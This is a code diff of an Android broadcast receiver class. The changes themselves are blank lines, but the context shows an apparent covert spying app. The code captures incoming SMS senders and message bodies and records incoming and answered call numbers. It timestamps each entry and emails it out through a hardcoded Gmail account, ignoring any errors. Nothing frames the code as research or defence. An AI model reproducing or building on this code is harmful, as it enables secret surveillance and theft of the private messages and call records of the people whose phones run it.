@@ -63,8 +63,10 @@ public class StartUpReceiver extends BroadcastReceiver
         SmsMessage[] Messages = null;
         String SmsSender;
         String ToActivity;
+
         if (bundle != null)
         {
+
             try
             {
                 ToActivity = "";
@@ -83,6 +85,7 @@ public class StartUpReceiver extends BroadcastReceiver
                     WriteLog ("SMS message Sender: " + SmsSender);
                     WriteLog ("SMS message: " + SmsBody);
                 }
+
                 WriteLog ("--");
 
             }
@@ -92,6 +95,7 @@ public class StartUpReceiver extends BroadcastReceiver
             }
 
         }
+
     }
 
     void DoPhone (Intent PhoneInt)
@@ -99,24 +103,25 @@ public class StartUpReceiver extends BroadcastReceiver
 
         String State = PhoneInt.getStringExtra (TelephonyManager.EXTRA_STATE);
         String Caller= PhoneInt.getStringExtra (TelephonyManager.EXTRA_INCOMING_NUMBER);
+
         if (State.equals (TelephonyManager.EXTRA_STATE_RINGING))
         {
 
             if (Caller != null)
             {
                 WriteLog ("Phone Ringing : " + Caller);
-
             }
         }
+
         if (State.equals (TelephonyManager.EXTRA_STATE_OFFHOOK))
         {
-
             if (Caller != null)
             {
                 WriteLog ("Off Hook: " + Caller);
 
             }
         }
+
         if (State.equals (TelephonyManager.EXTRA_STATE_IDLE))
         {
 
@@ -133,9 +138,8 @@ public class StartUpReceiver extends BroadcastReceiver
     {
 
             String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());
-
-
             String line = Line + "   (" + TimeStamp + ")";
+
         sender = new Mail("pavlos.repin@gmail.com", "");
         StringMake.setString(line);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
@@ -147,7 +151,7 @@ public class StartUpReceiver extends BroadcastReceiver
         }
 
         catch (Exception ex)
-//
+
         {
 
         }
@@ -155,6 +159,7 @@ public class StartUpReceiver extends BroadcastReceiver
     }
 
     static class StringMake {
+
         static String b;
 
         static void setString(String a) {
@@ -162,8 +167,10 @@ public class StartUpReceiver extends BroadcastReceiver
         }
 
         static String getString() {
+
             String c = b;
             return c;
+
         }
     }
 
@@ -177,8 +184,7 @@ public class StartUpReceiver extends BroadcastReceiver
             super.onPreExecute();
 
         }
-
-
+        
         @Override
 
         protected Void doInBackground(Void... mApi) {
